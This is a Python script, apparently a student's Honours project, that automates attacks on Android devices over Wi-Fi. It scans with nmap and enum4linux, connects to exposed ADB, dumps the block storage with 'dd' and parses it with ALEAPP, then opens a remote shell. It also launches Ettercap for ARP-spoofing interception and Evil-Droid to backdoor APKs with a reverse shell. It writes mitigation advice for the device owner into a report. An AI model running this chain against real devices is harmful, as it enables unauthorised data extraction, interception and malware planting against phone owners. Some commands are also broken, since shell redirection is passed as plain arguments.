'''
Title: Automated Android Penetration Testing Toolkit (AAPTT).
Description: Automated pen-testing Python script for Android mobile devices, performs scanning, enumeration, exploitation, and post-exploitation.
Aim is to simplify security analysis of Android devices for Honours project.
Author: Thomas McVeigh, 1903631.
Date: 02/04/2023.
'''

#import necessary modules
from datetime import datetime
import subprocess
import time
import os

targetIP = input("Enter the IP address of the target device (i.e. 192.168.1.112): ") #get IP address of target device from user
start = time.monotonic() #take initial monotonic clock reading

hostUp = 0 #set host state to 0 (off) by default
adbVuln = 1 #assume target is vulnerable to ADB exploits until later tests
aleappFail = 0 #assume target will pass filesystem information to host until later tests
output, outputErr = "", "" #declare string variable to hold lines of process & error output
return_code = None #declare variable to hold process return code

command = ['nmap', '-PE', '-sP', targetIP] #nmap ICMP ping scan, check if host is up
process = subprocess.Popen(command, #create subprocess ICMP ping scan with target IP from user
                            stdout=subprocess.PIPE, #open new pipe to store output
                            stderr=subprocess.PIPE, #open new pipe to store error output
                            universal_newlines=True) #translate bytes into readable text

output, outputErr = process.communicate() #read subprocess output and wait for subprocess to exit

while True: #replacement for "Do, While" loop in Python is "While True, If, Break"
    return_code = process.poll() #check if a return code has been issued by polling the process
    if return_code is not None: #if a return code has been issued
        if output.find("Host is up") != -1: #if scan output does not state the host is down
            hostUp = 1 #set 'hostUp' to 1 (on)
            print(output)
            print('The Nmap ICMP ping scan found that the target ' + targetIP + ' is up and addressable.\n') #print to screen confirmation of toolkit continuing
        break #exit "While True" loop

output, outputErr = "", "" #empty strings to hold lines of process & error output
return_code = None #empty variable to hold process return code

if hostUp == 1: #if host is up
    f = open('aapttResults.txt', 'w') #create toolkitOutput.txt file
    f.write("Thank you for using the Automated Android Penetration Testing Toolkit (AAPTT)!\n") #write title line into text file
    f.write('The Nmap ICMP ping scan ("nmap -PE -sP ' + targetIP + '") found that the target is up and addressable.\n') #write confirmation of toolkit continuing to text file

    for x in range(8): #loop eight times, x value starts at 0
        match x: #read value of x, case determines action for each value of x
            case 0:
                command = ['nmap', '-Pn', '--script', 'adb.nse', targetIP] #first command to run Android vulnerability NSE script
            case 1:
                command = ['enum4linux', '-a', '-n', targetIP] #second command to run enum4linux
            case 2:
                command = ['adb', 'start-server'] #third command to start ADB server
            case 3:
                command = ['adb', 'tcpip', '5037'] #fourth command to set server to wireless connection mode
            case 4:
                command = ['adb', 'connect', targetIP+':5037'] #fifth command to connect to target device wirelessly
            case 5:
                command = ['adb', 'shell', '"dd fs=/dev/block/mmcblk0 2>/dev/null"', '>', 'mmcblk0.img'] #sixth command to download copy of Android filesystem
            case 6:
                command = ['gzip', '-c', 'mmcblk0.img', '>', 'mmcblk0.gz'] #seventh command to zip the Android filesystem into a gz file
            case 7: 
                command = ['python3', 'ALEAPP/aleapp.py', '-t', 'gz', '-i', 'mmcblk0.gz', '-o', '/home/kali'] #eighth command to launch ALEAPP to parse data from Android filesystem

        if x < 5 or x > 7 or adbVuln == 1: #check if a command should be run
            if x == 7: #if ALEAPP command is next to run
                try: #run the ALEAPP test
                    process = subprocess.Popen(command, #create subprocess ICMP ping scan with target IP from user
                            stdout=subprocess.PIPE, #open new pipe to store output
                            stderr=subprocess.PIPE, #open new pipe to store error output
                            universal_newlines=True) #translate bytes into readable text

                    output, outputErr = process.communicate() #read subprocess output and wait for subprocess to exit

                    while True: #replacement for "Do, While" loop in Python is "While True, If, Break"
                        return_code = process.poll() #check if a return code has been issued by polling the process
                        if return_code is not None: #if a return code has been issued
                            f.write('\nAndroid Logs, Events and ProtoBuf Parser (ALEAPP) looks to find interesting/useful information within the Android filesystem.\n') #write to text file what command was executed and why
                            if output.find("Report location:") != -1: #if a report has been generated by ALEAPP, the test must have been completed successfully
                                reportLocation = (output[:output.rfind(' ')])+'/index.html' #find location of ALEAPP report and store within "reportLocation" variable
                                os.system('open '+reportLocation) #open ALEAPP report in web browser
                                f.write('Filesystem copied from target device has been parsed, HTML report can now be found at '+reportLocation+'.\n') #write to text file that data has been carved by ALEAPP and write report location
                                f.write('The Android filesystem has been successfully wirelessly copied and carved. The target device must have been rooted providing escalated user privileges which make cyber-attacks more dangerous.\nThe Android device should be reset to remove root user privileges which can be done most simply by installing a new, official Android system update.\nOther methods can be found within this guide: https://www.androidauthority.com/how-to-unroot-android-phone-tablet-652905/.\n')
                            else:
                                print("Filesystem copied from target device is empty, root/superuser privileges are not active on the device (device has not been rooted).\nEven though a malicious user was able to gain access to the Android Debug Bridge, the device has denied access to sensitive data and protected the user.") #print to terminal that the filesystem could not be copied via ADB
                                f.write('Filesystem copied from target device is empty, root/superuser privileges are not active on the device (device has not been rooted).\nEven though a malicious user was able to gain access to the Android Debug Bridge, the device has denied access to sensitive data and protected the user.\n') #write to text file that the filesystem could not be copied via ADB
                                aleappFail = 1 #ALEAPP test has not been successful, Andriller should be run later
                        break
                except: #if the command fails, most likely due to an empty input file
                    print("Filesystem copied from target device is empty, root/superuser privileges are not active on the device (device has not been rooted).\nEven though a malicious user was able to gain access to the Android Debug Bridge, the device has denied access to sensitive data and protected the user.") #print to terminal that the filesystem could not be copied via ADB
                    f.write('Filesystem copied from target device is empty, root/superuser privileges are not active on the device (device has not been rooted).\nEven though a malicious user was able to gain access to the Android Debug Bridge, the device has denied access to sensitive data and protected the user.\n') #write to text file that the filesystem could not be copied via ADB
                    aleappFail = 1 #ALEAPP test has not been successful, Andriller should be run later
            else: #else the command to be run must not be the ALEAPP test
                process = subprocess.Popen(command, #create subprocess ICMP ping scan with target IP from user
                            stdout=subprocess.PIPE, #open new pipe to store output
                            stderr=subprocess.PIPE, #open new pipe to store error output
                            universal_newlines=True) #translate bytes into readable text

                output, outputErr = process.communicate() #read subprocess output and wait for subprocess to exit

                while True: #replacement for "Do, While" loop in Python is "While True, If, Break"
                    return_code = process.poll() #check if a return code has been issued by polling the process
                    if return_code is not None: #if a return code has been issued
                        if x == 0: #if first command has just been executed
                            f.write('\n"Nmap -Pn --script adb.nse ' + targetIP + '" - Network mapping scan to find open ports and test for Android Debug Bridge (ADB) weakness.\n') #write to text file what command was executed and why
                            if output.find("open") != -1 or output.find("filtered") != -1: #if noteworthy ports have been found
                                print(output) #print command output to terminal
                                #f.write(output) #write command output to text file
                                f.write('\nOpen ports, or poorly filtered ports, are usually present due to some applications, that have been installed by the user, poorly managing the permissions they have been granted and leaving ports open even when not in use.\nThe compromising app should be removed or fixed as soon as possible to prevent Denial-of-Service attacks from affecting device performance and to prevent more dangerous attacks which seek to gain privileges via the data leaked from open ports.\nAnother recommendation is to install a trusted Anti-Virus software app on your device from the Google Play Store i.e. Kaspersky, Norton, or AVG.\n') #write mitigation/alert message to text file for this security issue
                            else: #else no noteworthy ports have been found
                                #f.write(output) #write command output to text file
                                f.write('\nNo Open or poorly filtered ports were discovered by the Nmap scan.\nIt is still recommended that the user install and keep up to date a trusted Anti-Virus software app, i.e Kaspersky, Norton, or AVG, to ensure ports are not left open and/or unfiltered in the future.\n') #write to text file that no network issues have been uncovered
                        elif x == 1: #if second command has just been executed
                            #f.write('\n"enum4linux -a -n ' + targetIP + '" - List gathered device information from Linux-derived OS (Android).\n') #write to text file what command was executed and why
                            print(output+"\n") #print command output to terminal
                            #f.write('\n'+output+'\n') #write command output to text file
                        elif x == 4: #if fifth command has just been executed
                            f.write('\nUsing ADB to discover whether USB/Wi-Fi debugging has been left on and unsecured.\n') #write to text file what command was executed and why
                            if output.find("failed") != -1: #if connecting to target device via ADB has been unsuccessful
                                print(output+"\n") #print command output to terminal
                                f.write(output) #write command output to text file
                                f.write('\nADB was not able to connect to the target device. This must mean that USB/Wi-Fi debugging has not been left turned on and is therefore secure.\nThe user should stay alert to make sure they continue to ensure debugging is left turned off when not in active use to test new apps.\nIt is recommended the user either check this setting each time they finish debugging a new app or re-run this toolkit.\n') #write to text file that the target device is not vulnerable to ADB attacks
                                adbVuln = 0 #target is not vulnerable to ADB exploits
                                aleappFail = 1 #ALEAPP test will not be able to run, Andriller should be run later
                            else:
                                f.write('\nADB was able to connect to the target device. This must mean that USB/Wi-Fi debugging must have been left on and has not been secured.\nThe user should make sure to find the "Developer Options" tab within their device settings and turn off "USB Debugging" and "Wi-Fi Debugging" whenever they are not testing new apps.\nIf the user does not need to debug new apps, they may also wish to turn off "Developer Options" entirely from the same tab to ensure this issue cannot continue to occur.\n') #write to text file that the target device is vulnerable to ADB attacks and how to mitigate this
                        elif x == 5: #if sixth command has just been executed
                            if output.find("Read-only file system") != -1: #if shell command is rejected/denied by target device
                                print("ADB has been unable to copy the target device filesystem.") #print error message to terminal
                                f.write('ADB has been unable to copy the target device filesystem. This means that the target device has managed to deny access to sensitive data despite allowing an unauthorised ADB connection.\nThis may occur when the USB/Wi-Fi debugging settings have been left switched on but the device has not been rooted meaning the malicious user does not have the correct privileges to copy sensitive data.\nA malicious user may still be able to copy images and videos from the device though so it is still best practice to switch off USB/Wi-Fi debugging when not needed.\n') #write to text file that ADB was unable to copy data from the target device
                                aleappFail = 1 #ALEAPP test will not be able to run, Andriller should be run later
                    break

        output, outputErr = "", "" #empty strings to hold lines of process & error output
        return_code = None #empty variable to hold process return code

    #end of tools run to completion programmatically

    if adbVuln == 1: #if connection to target device was successful
        os.system('adb shell') #execute a remote shell via ADB
        #user can manually navigate remote shell and execute whatever commands they wish, some safe commands are included in toolkit instruction manual.
        os.system('adb disconnect') #disconnect ADB between host device and target device
        os.system('adb kill-server') #stop ADB server on host device
        #clean up adb after user navigates through shell

        f.write('\nAn Android device shell has been opened using the Android Debug Bridge, the user should have used this opportunity to execute some commands to view the potential dangers of this attack.\nIf the device has not been rooted, the user will only be able to execute a select few commands that do no damage.\n')

    if aleappFail == 1: #if ALEAPP test previously failed
        os.system('python3 -m andriller') #execute Andriller GUI tool to extract data from target device manually via USB, user must refer to instruction manual

        f.write('\nSince the ALEAPP tool was not able to successfully carve information from the Android filesystem, the Andriller tool was opened for the user to investigate.\nSince this tool requires explicit permission from a user with access to the device and a USB connection, this is less of a threat to a user in a more realistic scenario but is useful to inform the user of all possibilities.\n')

    os.system('ettercap -G') #execute Ettercap GUI tool to sniff data between target and network router via ARP spoofing/poisoning

    f.write('\nThe Ettercap tool makes use of Man-in-the-Middle (MITM) attacks to spy on the network traffic of the chosen target IP.\n\nThis means that any user with access to their network, wherever they go, can view information the Android device user believes is private. This shows the importance of awareness when using public Wi-Fi networks and the use of a Virtual Private Network (VPN).\nFinally, some Android devices may even be prevented from navigating through webpages on their web browser which turns the attack from an information stealing attack into a Denial-of-Service attack.\n')

    os.system('./Evil-Droid/evil-droid') #execute Evil-Droid tool to inject a backdoor into a legitimate APK, create website to download APK from, and open reverse shell on host to wait for APK to launch

    f.write('\nThe final tool launched is the Evil-Droid tool which can build a malicious section of code into an Android app.\nOnce the user has managed to use this tool and observe the affects of these types of attacks, they should be aware of the dangers of downloading any suspicious or unneccesary apps to their device.\nUsers should also be aware of apps even published on the Google Play Store as some of these have been found to be dangerous in the past.\nIt is best to avoid any apps the user does not fully trust and to heed all advice/warnings they may receive from the Google Play Protect service built into their device to keep their device secure. Again, trusted Anti-Virus software apps help to bolster the security of an Android device to protect against these security threats.\n')

    end = time.monotonic() #take final monotonic clock reading
    print("\nThe time taken (in seconds) to complete the test was: ", str(round(end - start, 2))) #print time elapsed (2 decimal places) to terminal
    f.write('\nThe time taken (in seconds) to complete the test was: '+str(round(end - start, 2))+'\n') #write time elapsed (2 decimal places) to text file
    f.write('\nThis test was completed: '+str(datetime.now())) #write current date/time stamp to text file, helps user to keep track of when the last test was carried out
    f.write('\nAutomated Android Penetration Testing Toolkit created by Thomas McVeigh, 1903631, BSc (Hons) Ethical Hacking, Abertay University, 2023.') #write toolkit name and author information to text file
    f.close() #close text file, nothing more to write
else:
    end = time.monotonic()#take final monotonic clock reading
    print("\nThe test cannot continue, the target IP supplied cannot be contacted, ensure the IP entered is correct and the device is connected to the correct WiFi network.") #alert user as to why the test did not continue
    print("\nThe time taken (in seconds) to execute the script was: ", str(round(end - start, 2))) #print time elapsed to 2 decimal places
    #test did not produce any results so no point in overwriting previous test output file